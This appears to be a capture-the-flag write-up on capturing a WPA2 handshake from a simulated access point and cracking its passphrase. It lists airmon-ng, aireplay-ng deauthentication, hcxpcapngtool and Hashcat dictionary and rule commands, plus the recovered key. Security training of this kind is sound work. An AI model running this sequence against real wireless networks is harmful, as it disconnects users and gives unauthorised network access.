---
title: "Cracking WPA2 Handshake with Hashcat"
slug: "wpa2-handshake-crack"
category: "password-cracking"
description: "Capturing and cracking a WPA2 four-way handshake from a wireless network using aircrack-ng and Hashcat with custom rules."
date: "2024-01-10"
---

## Overview

This challenge involved capturing a WPA2 handshake from a simulated wireless access point and cracking the pre-shared key using GPU-accelerated hash cracking.

## Capturing the Handshake

### Setting Up Monitor Mode

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

Target AP identified:
- **BSSID**: `AA:BB:CC:DD:EE:FF`
- **Channel**: 6
- **ESSID**: `CorpWiFi`

### Deauthentication Attack

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

The four-way handshake was captured successfully.

## Converting the Capture

```bash
hcxpcapngtool -o hash.hc22000 capture-01.cap
```

## Cracking with Hashcat

### Dictionary Attack

```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

No match found with the standard wordlist.

### Rule-Based Attack

```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Result**: `CorpWiFi:Summer2024!`

## Key Takeaways

- WPA2-PSK is only as strong as the passphrase
- Rule-based attacks significantly expand wordlist coverage
- GPU acceleration makes cracking feasible for complex passwords
- Consider WPA3 for stronger wireless security

## Tools Used

- aircrack-ng suite
- hcxtools
- Hashcat
- Custom rule files
